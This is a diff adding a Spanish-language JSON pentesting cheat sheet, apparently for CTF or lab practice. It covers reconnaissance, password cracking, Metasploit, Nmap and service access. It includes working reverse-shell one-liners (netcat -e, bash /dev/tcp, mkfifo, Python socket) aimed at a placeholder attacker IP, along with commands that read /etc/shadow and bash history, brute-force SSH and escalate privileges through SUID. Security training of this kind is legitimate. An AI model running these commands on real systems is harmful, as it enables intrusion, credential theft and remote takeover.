@@ -1,0 +1,346 @@
+{
+    "Fase de Reconocimiento": [
+        {
+            "title": "Ver permisos sudo",
+            "command": "sudo -l",
+            "description": "Muestra los permisos sudo del usuario actual y qué comandos puede ejecutar."
+        },
+        {
+            "title": "Ver ficheros de usuarios con permisos sudo",
+            "command": "cat /etc/sudoers",
+            "description": "Lista los usuarios y grupos con permisos sudo en el sistema."
+        },
+        {
+            "title": "Ver usuarios en el sistema",
+            "command": "cat /etc/passwd",
+            "description": "Muestra la lista de usuarios del sistema, junto con sus detalles."
+        },
+        {
+            "title": "Ver contraseñas de usuarios (shadow)",
+            "command": "cat /etc/shadow",
+            "description": "Muestra las contraseñas cifradas de los usuarios del sistema."
+        },
+        {
+            "title": "Ver grupos del sistema",
+            "command": "cat /etc/group",
+            "description": "Muestra la lista de grupos del sistema."
+        },
+        {
+            "title": "Buscar archivos con permisos SUID",
+            "command": "find / -perm -4000 2>/dev/null",
+            "description": "Busca archivos con el bit SUID habilitado, lo que puede indicar posibles vectores de ataque."
+        },
+        {
+            "title": "Ver historial de comandos de un usuario",
+            "command": "cat /home/<usuario>/.bash_history",
+            "description": "Muestra el historial de comandos ejecutados por un usuario."
+        },
+        {
+            "title": "Ver configuraciones de red",
+            "command": "cat /etc/network/interfaces",
+            "description": "Muestra las configuraciones de red en el sistema."
+        }
+    ],
+    "Diccionarios": [
+        {
+            "title": "Rockyou",
+            "command": "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt",
+
+            "description": "La lista de palabras RockYou.txt es un arma de doble filo: muy valiosa para los profesionales de seguridad, pero también un arma potente para los hackers."
+        },
+        {
+            "title": "usernames",
+            "command": "https://github.com/jeanphorn/wordlist/blob/master/usernames.txt",
+            "description": "Usuarios"
+        }
+    ],
+
+    "Análisis de Archivos": [
+        {
+            "title": "Strings",
+            "command": "strings nombre_de_fichero",
+            "description": "Extrae y muestra las cadenas de texto legibles de un archivo."
+        },
+        {
+            "title": "Hexeditor",
+            "command": "hexeditor nombre_de_fichero",
+            "description": "Visualiza el contenido hexadecimal de un archivo."
+        }
+    ],
+
+    "Fuerza Bruta": [
+        {
+            "title": "Crunch",
+            "command": "crunch min max [opciones]",
+            "description": "Genera diccionarios basados en parámetros definidos por el usuario. Ej: crunch 8 12 -t @@@@@@@@ -o wordlist.txt"
+        },
+        {
+            "title": "Hashcat (modo sin diccionario)",
+            "command": "hashcat -a 3 hash.txt ?d?d?d?d",
+            "description": "Ataque de fuerza bruta puro sin diccionario."
+        },
+        {
+            "title": "Hashcat (modo con diccionario)",
+            "command": "hashcat -m 0 -a 0 hash.txt wordlist.txt",
+            "description": "Ataque con diccionario usando el modo MD5 (-m 0)."
+        },
+        {
+            "title": "John the Ripper (diccionario)",
+            "command": "john --wordlist=wordlist.txt hash.txt",
+            "description": "Usa un diccionario para crackear contraseñas."
+        },
+        {
+            "title": "John the Ripper (fuerza bruta)",
+            "command": "john --incremental hash.txt",
+            "description": "Ataque de fuerza bruta puro con todas las combinaciones posibles."
+        },
+        {
+            "title": "Hydra (ataque contra servicio SSH)",
+            "command": "hydra -l usuario -P wordlist.txt ssh://192.168.1.1",
+            "description": "Ataque de fuerza bruta contra el servicio SSH."
+        }
+    ],
+
+    "Reverse Shells": [
+        {
+            "title": "Reverse Shell usando Netcat (máquina atacante)",
+            "command": "nc -lvnp 4444",
+            "description": "Escucha en el puerto 4444 para recibir la conexión reversa."
+        },
+        {
+            "title": "Reverse Shell desde víctima",
+            "command": "nc <IP_KALI> 4444 -e /bin/bash",
+            "description": "Conecta a la máquina atacante y ejecuta una shell bash."
+        },
+        {
+            "title": "Reverse Shell usando Bash",
+            "command": "bash -i >& /dev/tcp/<IP_KALI>/4444 0>&1",
+            "description": "Utiliza redirección en Bash para establecer una conexión reversa."
+        },
+        {
+            "title": "Reverse Shell usando mkfifo",
+            "command": "mkfifo /tmp/f; /bin/sh < /tmp/f | nc <IP_KALI> 4444 > /tmp/f",
+            "description": "Usa `mkfifo` para crear un canal FIFO y establecer una conexión reversa con Netcat."
+        },
+        {
+            "title": "Reverse Shell usando Python (línea de comandos)",
+            "command": "python -c \"import socket, subprocess, os; s=socket.socket(); s.connect(('<IP_KALI>', 4444)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p=subprocess.call([\"/bin/bash\", \"-i\"])\"",
+            "description": "Usa Python directamente en la línea de comandos para crear una reverse shell."
+        }
+    ],
+
+    "Mejora de Shell": [
+        {
+            "title": "Estabilizar shell con Python",
+            "command": "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
+            "description": "Convierte una shell simple en una shell interactiva utilizando Python."
+        },
+        {
+            "title": "Mejorar visualización de la shell",
+            "command": "export TERM=xterm",
+            "description": "Define el terminal para mejorar la visualización en la shell remota."
+        },
+        {
+            "title": "Mejorar visualización de la shell si no tienes bash y solo sh",
+            "command": "export TERM=xterm; stty raw -echo; fg",
+            "description": "Define el terminal para mejorar la visualización en la shell remota."
+        }
+    ],
+
+    "SUID y Privilegios Sudo": [
+        {
+            "title": "Elevar privilegios con Python",
+            "command": "python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
+            "description": "Ejecuta una shell como root en un sistema con SUID."
+        },
+        {
+            "title": "Buscar binarios SUID",
+            "command": "find / -perm -4000 2>/dev/null",
+            "description": "Encuentra binarios con el bit SUID habilitado para posible explotación."
+        }
+    ],
+
+    "MSFConsole Tips": [
+        {
+            "title": "Buscar Exploits",
+            "command": "search <nombre_del_exploit>",
+            "description": "Busca un exploit específico en la base de datos de Metasploit."
+        },
+        {
+            "title": "Actualizar Base de Datos",
+            "command": "msfupdate",
+            "description": "Actualiza Metasploit Framework con los últimos módulos y exploits disponibles."
+        },
+        {
+            "title": "Actualizar el Sistema",
+            "command": "sudo apt update && sudo apt install metasploit-framework",
+            "description": "Actualiza la base de datos de Metasploit y asegura que tengas la última versión del framework."
+        },
+        {
+            "title": "Reiniciar Base de Datos de Metasploit",
+            "command": "msfdb reinit",
+            "description": "Reinicia la base de datos de Metasploit Framework para solucionar posibles problemas con la base de datos."
+        },
+        {
+            "title": "Iniciar msfconsole",
+            "command": "msfconsole",
+            "description": "Inicia la consola de Metasploit Framework."
+        },
+        {
+            "title": "Ver Opciones de un Módulo",
+            "command": "show options",
+            "description": "Muestra las opciones configurables para el módulo seleccionado."
+        },
+        {
+            "title": "Ver Módulos Disponibles",
+            "command": "show modules",
+            "description": "Muestra todos los módulos disponibles para usar (exploits, payloads, auxiliares, etc.)."
+        },
+        {
+            "title": "Configurar Opciones de un Módulo",
+            "command": "set <opción> <valor>",
+            "description": "Configura una opción específica para un módulo (Ej: set RHOST 192.168.1.1)."
+        },
+        {
+            "title": "Ver Información de un Módulo",
+            "command": "info <nombre_del_módulo>",
+            "description": "Muestra detalles sobre el módulo seleccionado, como su descripción, vulnerabilidades que explota, etc."
+        },
+        {
+            "title": "Iniciar un Exploit",
+            "command": "exploit",
+            "description": "Ejecuta el exploit con las opciones configuradas."
+        },
+        {
+            "title": "Poner un Módulo en Segundo Plano",
+            "command": "background",
+            "description": "Pone el exploit o sesión en segundo plano para continuar con otras tareas."
+        },
+        {
+            "title": "Crear una Sesión",
+            "command": "sessions -i <ID_de_sesión>",
+            "description": "Accede a una sesión de meterpreter activa por medio de su ID."
+        },
+        {
+            "title": "Listar Sesiones Activas",
+            "command": "sessions",
+            "description": "Muestra una lista de las sesiones activas en Metasploit."
+        },
+        {
+            "title": "Salir de una Sesión",
+            "command": "exit",
+            "description": "Cierra una sesión activa y regresa al prompt de Metasploit."
+        },
+        {
+            "title": "Establecer RHOST, LHOST y LPORT",
+            "command": "set RHOST <IP_victima>, set LHOST <IP_atacante>, set LPORT <puerto>",
+            "description": "Define los valores para las direcciones y puertos de la víctima (RHOST) y del atacante (LHOST), así como el puerto de escucha (LPORT)."
+        },
+        {
+            "title": "Ver el Estado de la Base de Datos",
+            "command": "db_status",
+            "description": "Muestra el estado de la base de datos de Metasploit (si está conectada o no)."
+        }
+    ],
+
+    "Nmap Scans": [
+        {
+            "title": "Escaneo de Red (descubrir hosts)",
+            "command": "nmap -sn 192.168.1.0/24",
+            "description": "Realiza un escaneo de red para descubrir qué dispositivos están activos en la red."
+        },
+        {
+            "title": "Escaneo de Puertos",
+            "command": "nmap -p 1-65535 192.168.1.1",
+            "description": "Escanea todos los puertos de la IP especificada."
+        },
+        {
+            "title": "Escaneo de Servicios (versión)",
+            "command": "nmap -sV 192.168.1.1",
+            "description": "Escanea los servicios que están corriendo en los puertos abiertos y muestra sus versiones."
+        },
+        {
+            "title": "Escaneo de Sistema Operativo",
+            "command": "nmap -O 192.168.1.1",
+            "description": "Intenta identificar el sistema operativo del host remoto."
+        },
+        {
+            "title": "Escaneo de Vulnerabilidades",
+            "command": "nmap --script vuln 192.168.1.1",
+            "description": "Realiza un escaneo para detectar posibles vulnerabilidades conocidas en el host."
+        }
+    ],
+
+    "Searchsploit": [
+        {
+            "title": "Buscar Exploit",
+            "command": "searchsploit <nombre_del_exploit>",
+            "description": "Busca un exploit en la base de datos de Searchsploit."
+        },
+        {
+            "title": "Ver Exploit Detallado",
+            "command": "searchsploit -x <ruta_del_exploit>",
+            "description": "Muestra el código fuente de un exploit específico."
+        }
+    ],
+
+    "FTP": [
+        {
+            "title": "Conectarse a un servidor FTP",
+            "command": "ftp <IP_del_servidor>",
+            "description": "Conecta al servidor FTP."
+        },
+        {
+            "title": "Conectarse con usuario y contraseña en FTP",
+            "command": "ftp <usuario>@<IP_del_servidor>",
+            "description": "Conecta al servidor FTP utilizando un usuario."
+        },
+        {
+            "title": "Ver ficheros en FTP",
+            "command": "ls",
+            "description": "Lista los archivos en el servidor FTP."
+        },
+        {
+            "title": "Descargar ficheros desde FTP",
+            "command": "get <archivo>",
+            "description": "Descarga un archivo del servidor FTP."
+        }
+    ],
+
+    "SSH": [
+        {
+            "title": "Conectarse a un servidor SSH",
+            "command": "ssh <usuario>@<IP_del_servidor>",
+            "description": "Conecta al servidor SSH con un usuario."
+        },
+        {
+            "title": "Conectarse cambiando el puerto de SSH",
+            "command": "ssh -p <puerto> <usuario>@<IP_del_servidor>",
+            "description": "Conecta al servidor SSH especificando el puerto."
+        },
+        {
+            "title": "Mover ficheros en SSH",
+            "command": "scp <archivo> <usuario>@<IP_del_servidor>:/ruta/destino/",
+            "description": "Mueve un archivo hacia el servidor remoto a través de SSH."
+        },
+        {
+            "title": "Descargar ficheros desde SSH",
+            "command": "scp <usuario>@<IP_del_servidor>:/ruta/del/archivo /home/usuario/",
+            "description": "Descarga un archivo desde el servidor remoto a tu directorio local."
+        }
+    ],
+
+ "MySQL": [
+    {
+        "title": "Conectarse a MySQL",
+        "command": "mysql -u <usuario> -p",
+        "description": "Conecta a MySQL usando el usuario proporcionado."
+    },
+    {
+        "title": "Conectarse a MySQL con puerto diferente",
+        "command": "mysql -u <usuario> -p -h <IP_victima> -P <puerto>",
+        "description": "Conecta a MySQL usando un puerto diferente al estándar."
+    }
+]
+
+}
